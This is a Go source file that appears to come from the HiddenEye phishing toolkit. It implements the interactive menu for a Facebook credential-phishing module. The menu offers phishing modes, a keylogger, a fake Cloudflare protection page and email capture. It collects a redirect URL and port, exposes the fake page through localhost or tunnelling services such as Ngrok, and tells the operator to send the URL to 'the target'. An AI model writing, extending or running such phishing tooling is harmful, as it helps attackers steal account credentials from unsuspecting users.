package controllers

import (
	"HiddenEye/helpers"
	Colors "HiddenEye/utils"
	"fmt"

	Services "HiddenEye/services"
)

type Phishing struct {
	port int
	url  string
}

func Facebook(name string) {
	var ph Phishing
	helpers.Clear_screen()
	helpers.Prompt()
	fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), Colors.Red(), name, Colors.White(), " module is loaded sucessfully\t")
	fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Select Mode\t")

	fmt.Println(Colors.Red(), "\n\n--------------------------------------------------------------------------------------------------")

	fmt.Print(Colors.Red(), "\nOperation Mode:")
	fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"1"+Colors.Red()+"]", Colors.White(), " Standard Phising Attack",
		Colors.Red(), "\t\t\t["+Colors.White()+"2"+Colors.Red()+"]", Colors.White(), " Fake Security",
	)

	fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"3"+Colors.Red()+"]", Colors.White(), " Poll Ranking Phising Attack",
		Colors.Red(), "\t\t["+Colors.White()+"4"+Colors.Red()+"]", Colors.White(), " Poll Mesenger Credentials",
	)

	fmt.Print(Colors.Red(), "\n\n┌─[ "+Colors.Green()+"HIDDEN-EYE"+Colors.Blue()+"~"+Colors.White()+"@HOME"+Colors.Red()+
		"/"+Colors.Blue()+"TEMPLATE"+Colors.Red()+" ]"+"\n└──╼ "+Colors.White()+"$ ")

	option := helpers.Input_User(1, 4)

	if option == 1 {
		helpers.Clear_screen()
		helpers.Prompt()

		fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"1"+Colors.Red()+"]", Colors.White(), " Keylogger",
			Colors.Red(), "\n\n["+Colors.White()+"2"+Colors.Red()+"]", Colors.White(), " Fake CloudFare Protection",
		)

		fmt.Println(Colors.Red(), "\n["+Colors.White()+"3"+Colors.Red()+"]", Colors.White(), " Capture Data Email")

		fmt.Print(Colors.Red(), "\n\n┌─[ "+Colors.Green()+"HIDDEN-EYE"+Colors.Blue()+"~"+Colors.White()+"@HOME"+Colors.Red()+
			"/"+Colors.Blue()+"TEMPLATE"+
			"/"+Colors.Blue()+"FEATURES"+Colors.Red()+" ]"+"\n└──╼ "+Colors.White()+"$ ")

		option := helpers.Input_User(1, 3)

		if option == 1 {
			fmt.Println(option)
		} else if option == 2 {
			helpers.Clear_screen()
			helpers.Prompt()

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Insert a custom redirect URL")

			fmt.Print(Colors.Red(), "\nRedirect URL >> "+Colors.White())

			fmt.Scanln(&ph.url)

			helpers.Clear_screen()
			helpers.Prompt()

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Select Port [1-65535]")
			fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " We suggest using ports between [1024-65535] but you still able to choose any ports you want.")
			fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " In case of Ngrok use the port you set for Ngrok")

			fmt.Print(Colors.Red(), "\nRedirect Port >> "+Colors.White())

			_, err := fmt.Scanln(&ph.port)
			if err != nil {
				fmt.Println(err)
			}

			helpers.Clear_screen()
			helpers.Prompt()

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Selecy any availible server")

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"1"+Colors.Red()+"]", Colors.White(), " Localhost",
				Colors.Red(), "\t\t["+Colors.White()+"2"+Colors.Red()+"]", Colors.White(), " Ngrok",
			)

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"3"+Colors.Red()+"]", Colors.White(), " Serveo",
				Colors.Red(), "\t\t\t["+Colors.White()+"4"+Colors.Red()+"]", Colors.White(), " Localxpose",
			)

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"5"+Colors.Red()+"]", Colors.White(), " Localtunnel",
				Colors.Red(), "\t\t["+Colors.White()+"6"+Colors.Red()+"]", Colors.White(), " OpenPort",
			)

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"7"+Colors.Red()+"]", Colors.White(), " PageKite")

			fmt.Print(Colors.Red(), "\n\n┌─[ "+Colors.Green()+"HIDDEN-EYE"+Colors.Blue()+"~"+Colors.White()+"@HOME"+Colors.Red()+
				"/"+Colors.Blue()+"TEMPLATE"+Colors.Red()+
				"/"+Colors.Blue()+"FEATURES"+Colors.Red()+
				"/"+Colors.Blue()+"SERVER"+Colors.Red()+" ]"+"\n└──╼ "+Colors.White()+"$ ")

			option := helpers.Input_User(1, 7)

			if option == 1 {
				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Send this URL to the target on the same nertwork")
				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.Green(), " Localhost URL : https://localhost:", ph.port)
				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Hidden Eye is Listening to https://localhost:", ph.port)
				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Waiting for the target to Interact")

				Services.PhisingHandler(ph.port, ph.url)
			} else if option == 2 {

				Services.NgrokHandler(ph.port, ph.url)
			}

		}

	}

}
